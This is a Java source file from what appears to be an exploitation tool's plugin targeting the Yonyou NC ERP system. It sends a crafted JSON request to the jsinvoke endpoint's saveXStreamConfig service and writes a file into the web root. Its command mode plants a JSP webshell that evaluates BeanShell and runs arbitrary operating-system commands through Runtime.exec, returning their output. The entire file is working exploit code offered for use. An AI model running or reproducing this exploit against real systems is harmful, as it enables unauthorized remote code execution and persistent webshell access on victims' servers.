package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class yongyou_nc_jsInvoke_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }


    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n  nc_jsinvoke-RCE-写入shell操作不稳定，请使用ldap利用");
        });
        return false;
    }

    public String target_url(String url, String payload,String filename) {
        try {
            HttpTools res = new HttpTools();
            HashMap<String, String> head = new HashMap();
            head.put("Content-Type", "application/json");
            String postdata = "{ \"serviceName\":\"nc.itf.iufo.IBaseSPService\", \"methodName\":\"saveXStreamConfig\", \"parameterTypes\":[ \"java.lang.Object\", \"java.lang.String\" ],\"parameters\":[\"${" + payload + "}\", \"webapps/nc_web/" + filename + "\" ] }";
            Response post1 = res.post(url + "/uapjs/jsinvoke/?action=invoke", postdata, head, "utf-8");

            if (post1.getCode() == 200) {
                return url + "/" + filename;
            }else {
                    return null;
            }
        } catch (Exception e) {
            return null;
        }
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            String payload = "Hello R4gd0ll";
            long t = (new Date()).getTime();
            String result = target_url(url, payload,t+".txt");
            if (result != null) {
                Response get1 = HttpTools.get(result,new HashMap<>(), "utf-8");
                if (get1.getText().contains("Hello") ) {
                    Platform.runLater(() -> {
                        textArea.appendText("\n [ yongyou_nc_jsInvoke_RCE ]");
                        textArea.appendText("\n 文件上传成功访问: " + result);
                        textArea.appendText("\n 输入CMD命令进行ATT测试回显");
                        textArea_cmd.appendText("\n " + get1.getText() + "\n ");
                    });
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
//
    private Boolean attcmd(String url, String cmd,TextArea textArea,TextArea textArea_cmd) {
        try {
            String payload = "param.getClass().forName(param.error).newInstance().eval(param.cmd)";
            String result = target_url(url, payload,"R4gTest.jsp");
            HttpTools res = new HttpTools();
            Response get1 = res.get(result+"?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22"+cmd+"%22).getInputStream())", new HashMap<>(), "utf-8");
            if (get1.getText().contains("<string>") && get1.getCode()==200) {
                int start = get1.getText().indexOf("<string>")+8;
                int end = get1.getText().indexOf("</string>");
                String echo = get1.getText().substring(start,end);
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+echo);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_BshServlet_RCE-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
